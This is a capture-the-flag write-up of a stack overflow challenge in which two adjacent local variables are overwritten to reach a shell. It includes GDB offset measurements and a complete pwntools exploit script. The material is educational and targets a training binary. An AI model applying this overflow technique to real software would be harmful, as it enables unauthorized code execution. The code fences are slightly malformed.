## Cosmic Burger - Overwrite Multiple Stack Variables

### The Challenge and the Core Problem

This challenge extends the variable overwrite concept from a single target to two variables that must both be corrupted in the same overflow. There is no `win()` function and no return address to redirect, so control flow hijacking is entirely off the table. Instead, the program declares three local variables on the stack, an `order` buffer of 32 bytes and two `int` variables named `cheese` and `sauce`, and only spawns a shell if both hold the exact values `0xF00D` and `0xBEEF` simultaneously. A single unbounded read into `order` is enough to reach both of them.

### Phase 1 - Reconnaissance

Running `checksec` on the binary establishes the protection profile before anything else:

```bash
checksec --file ./cosmic_burger
```

Since the technique here is a pure variable overwrite with no addresses involved, PIE status is irrelevant regardless of what it reports, and the absence of a canary means the overflow proceeds freely. NX being enabled is similarly irrelevant because shellcode was never part of the plan.

### Phase 2 - Identifying the Control Point

The control point is not RIP here. The program checks two local stack variables after the read, and the branch that leads to the shell is only taken when both conditions are satisfied at the same time, making it necessary to overwrite both in a single payload. `cheese` must equal `0xF00D` and `sauce` must equal `0xBEEF`.

### Phase 3 - Measuring the Offsets

The exact distances from `order` to each variable are found by setting a breakpoint at `vuln` in GDB, running the binary, and printing the addresses of all three variables:

```bash
gdb ./cosmic_burger
break vuln
run
p &order
p &cheese
p &sauce
```

The distances are then computed from the printed addresses:

````bash
python3 -c "print(0x7fffffffe2d8 - 0x7fffffffe2b0)"  # cheese → 40
python3 -c "print(0x7fffffffe2dc - 0x7fffffffe2b0)"  # sauce  → 44
```

The resulting stack layout makes the payload structure immediately clear, with `order` occupying the first 32 bytes, a 4-byte alignment gap sitting between it and `cheese`, and then `cheese` and `sauce` lying back to back at offsets 40 and 44 respectively:
```
[ 32 bytes order  ]  ← buffer starts here
[  4 bytes gap    ]  ← compiler alignment padding
[  4 bytes cheese ]  ← offset 40, must equal 0xF00D
[  4 bytes sauce  ]  ← offset 44, must equal 0xBEEF
````

Because both `cheese` and `sauce` are declared as `int`, they are each 4 bytes wide and must be written with `p32()` rather than `p64()`. The two variables sit contiguously in memory, so a single flat payload starting with 40 bytes of padding and followed by both values in order is all that is needed.

### Phase 4 - The Exploit

Three corrections apply to the original script: `process([exe.path])` must be `process(exe.path)` since `exe.path` is already a string, the `gdb.attach(r)` DEBUG block is not part of the canonical `conn()` template and should be removed, and the spacing around `OFFSET_TO_SAUCE` has been made consistent with the aligned constant block style.

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./cosmic_burger")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_CHEESE = 40
OFFSET_TO_SAUCE  = 44

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    payload = flat(
        b'A' * OFFSET_TO_CHEESE,   # fill order buffer + alignment gap
        p32(0xF00D),                # cheese at offset 40
        p32(0xBEEF),                # sauce  at offset 44
    )

    r.recvuntil(b"What's your order?\n")
    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':
    main()
```